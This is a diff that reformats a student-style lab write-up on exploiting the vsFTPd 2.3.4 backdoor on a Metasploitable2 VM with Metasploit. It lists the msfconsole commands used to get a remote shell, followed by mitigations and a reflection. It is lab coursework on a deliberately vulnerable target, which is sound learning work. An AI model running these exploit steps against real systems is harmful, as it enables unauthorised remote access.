@@ -136,63 +136,64 @@ This lab helped me move from basic reconnaissance (Lab 2) to detailed vulnerabil
 
 ## Lab 4: Exploitation Using Metasploit
 
-## 1) Goal  
-Demonstrate exploitation of a vulnerable service (vsFTPd 2.3.4 backdoor) on Metasploitable2 using the Metasploit Framework.  
+### 1) Goal
+Demonstrate exploitation of a vulnerable service (vsFTPd 2.3.4 backdoor) on Metasploitable2 using the Metasploit Framework.
 
-## 2) Environment  
+### 2) Environment
 - Host: Windows 11, VirtualBox 7.x  
 - Attacker: Kali Linux 2025.2 VM  
 - Target: Metasploitable2 (Ubuntu 2.6.24 VM)  
 - Tool: Metasploit Framework (msfconsole)  
 
-## 3) Steps & Commands  
+### 3) Steps & Commands
 
-*Launched Metasploit Framework:*  
-```bash
+*Launched Metasploit Framework:*
+bash
 msfconsole
 
-Searched for available exploits:
 
+*Searched for available exploits:*
+bash
 search vsftpd
 
-Selected and configured exploit module:
 
+*Selected and configured exploit module:*
+bash
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOST [target_IP]
 exploit
 
-Interacted with the session (if successful):
 
+*Interacted with the session (if successful):*
+bash
 sessions -i 1
 whoami
 uname -a
 
 
-4) Results & Screenshots
-	•	Successfully launched Metasploit and selected the vsFTPd 2.3.4 exploit.
-	•	Exploit executed → gained remote shell access to Metasploitable2.
-	•	Verified access using whoami and uname -a.
+### 4) Results & Screenshots
+- Successfully launched Metasploit and selected the vsFTPd 2.3.4 exploit.  
+- Exploit executed → gained remote shell access to Metasploitable2.  
+- Verified access using whoami and uname -a.  
 
-Add screenshots here:
-	•	Metasploit module loaded
-	•	Exploit success message
-	•	Proof of shell access on target
+Add screenshots here:  
+- Metasploit module loaded  
+- Exploit success message  
+- Proof of shell access on target  
+
+### 5) Findings & Mitigation
+- *Finding:* vsFTPd 2.3.4 is vulnerable due to a known backdoor.  
+  *Mitigation:* Upgrade or disable the vulnerable FTP service.  
+- *Finding:* Exposed FTP service was accessible on the network.  
+  *Mitigation:* Restrict access with firewall rules and enforce strong authentication.  
+
+### 6) Reflection
+This lab taught me how to:  
+- Use Metasploit to search, select, and execute exploit modules.  
+- Understand how scanning (Lab 2–3) leads to exploitation (Lab 4).  
+- Recognize the importance of patch management and disabling unused services.  
 
 
-5) Findings & Mitigation
-	•	Finding: vsFTPd 2.3.4 is vulnerable due to a known backdoor.
-	•	Mitigation: Upgrade or disable the vulnerable FTP service.
-	•	Finding: Exposed FTP service was accessible on the network.
-	•	Mitigation: Restrict access with firewall rules and enforce strong authentication.
-
-
-
-6) Reflection
-
-This lab taught me how to:
-	•	Use Metasploit to search, select, and execute exploit modules.
-	•	Understand how scanning (Lab 2–3) leads to exploitation (Lab 4).
-	•	Recognize the importance of patch management and disabling unused services.
 
 
 
